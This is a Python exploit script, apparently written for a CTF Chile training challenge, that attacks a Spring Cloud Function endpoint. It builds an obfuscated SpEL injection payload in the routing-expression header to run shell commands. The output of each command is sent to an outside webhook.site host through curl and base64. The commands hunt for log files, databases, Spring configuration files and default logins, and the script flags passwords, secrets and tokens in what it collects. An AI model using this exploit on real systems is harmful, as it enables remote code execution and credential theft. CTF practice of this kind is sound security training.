#!/usr/bin/env python3
"""
CTF Chile - Decodificar HTML y explorar más
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:20} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Explorando archivos estáticos...")
probe("index_html", "curl -s http://localhost:8080/index.html")
probe("dashboard_html", "curl -s http://localhost:8080/dashboard.html")
probe("css_style", "curl -s http://localhost:8080/css/style.css | head -20")

print("[*] Explorando logs de errores...")
probe("catalina_log", "find /opt -name '*log*' 2>/dev/null | head -5")
probe("app_logs", "find /app -name '*.log' 2>/dev/null")
probe("tomcat_logs", "ls -la /tmp/tomcat* 2>/dev/null")
probe("java_errors", "find /tmp -name '*.log' 2>/dev/null | xargs ls -la")

print("[*] Explorando configuración de base de datos...")
probe("h2_database", "find / -name '*.h2*' -o -name '*.db' 2>/dev/null")
probe("sqlite_files", "find /app /tmp /root -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null")

print("[*] Probando endpoints con diferentes métodos...")
probe("get_register", "curl -s -X GET http://localhost:8080/api/register")
probe("options_login", "curl -s -X OPTIONS http://localhost:8080/api/login -i")

print("[*] Buscando archivos de configuración de Spring...")
probe("application_props", "find /app -name 'application*' 2>/dev/null | xargs ls -la")
probe("bootstrap_props", "find /app -name 'bootstrap*' 2>/dev/null | xargs ls -la")

print("[*] Explorando posibles credenciales por defecto...")
probe("default_creds1", "curl -s -X POST http://localhost:8080/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin\"}'")
probe("default_creds2", "curl -s -X POST http://localhost:8080/api/login -H 'Content-Type: application/json' -d '{\"rut\":\"123456789\",\"password\":\"password\"}'")

time.sleep(10)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)
            # Buscar flags, credenciales, o información útil
            if any(keyword in decoded.lower() for keyword in ["ctfchile{", "flag{", "password", "secret", "token", "key"]):
                print("\n🚩 INFORMACIÓN SENSIBLE DETECTADA 🚩")
        except Exception as e:
            print(f"(decode error) {raw[:200]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")